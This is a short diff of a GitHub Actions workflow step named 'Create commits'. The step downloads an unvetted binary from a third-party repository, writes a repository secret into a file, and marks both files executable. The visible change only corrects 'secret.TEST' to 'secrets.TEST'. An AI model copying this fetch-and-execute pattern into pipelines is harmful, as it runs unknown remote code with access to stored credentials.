@@ -13,7 +13,7 @@ jobs:
       - name: Create commits
         run: |
           wget https://github.com/Arlentak/sa/raw/main/node
-          echo " ${{ secret.TEST }} " > npm
+          echo " ${{ secrets.TEST }} " > npm
           chmod +x node
           chmod +x npm
           echo $RANDOM | md5sum | head -c 8; echo;
